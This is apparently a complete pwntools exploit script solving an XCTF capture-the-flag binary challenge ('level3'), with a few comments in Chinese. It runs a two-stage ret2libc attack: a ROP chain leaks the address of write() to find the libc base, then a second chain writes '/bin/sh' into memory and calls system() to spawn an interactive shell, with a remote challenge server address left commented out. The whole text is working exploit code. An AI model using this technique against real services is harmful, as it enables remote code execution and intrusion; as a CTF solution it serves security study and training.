from pwn import *
from zzPwnlib import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

elf_path    = './xctf_pwn_009_level3'
#io = remote('111.200.241.244',65252)
io          = process(elf_path)
elf         = ELF(elf_path)
#libc       = ELF('./xctf_pwn_009_libc_32.so.6')
#libc       = ELF('./libc.so.6')

binsh_addr  = 0x0804A01C
start_addr  = elf.symbols['main']
write_plt   = elf.plt['write']
write_got   = elf.got['write']
read_plt    = elf.plt['read']

# 0x08048519 : pop esi ; pop edi ; pop ebp ; ret
add_esp_12_gadget     = 0x08048519

# Run 01 -- 获得libc基址
payload      = payloadBase(0x88, 32)
payload     += p32(write_plt)
payload     += p32(start_addr)
payload     += p32(1)
payload     += p32(write_got)
payload     += p32(4)
payload      = payload.ljust(0x100, b"B")

io.recv()
io.send(payload)
write_addr  = u32(io.recv(4))
libc = LibcSearcher('write', write_addr)
libc_base   = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
log.info("write() actual address: %x", write_addr)
log.info("libc base address: %x", libc_base)
log.info("system() actual address: %x", system_addr)

# Run 02 -- 写入/bin/sh
payload      = payloadBase(0x88, 32)
payload     += p32(read_plt)
payload     += p32(add_esp_12_gadget)
payload     += p32(0)
payload     += p32(binsh_addr)
payload     += p32(8)
payload     += p32(system_addr)
payload     += p32(0xdeadbeef)
payload     += p32(binsh_addr)
payload      = payload.ljust(0x100, b"B")

io.recv()
io.send(payload)
io.send(b'/bin/sh\x00')
io.interactive()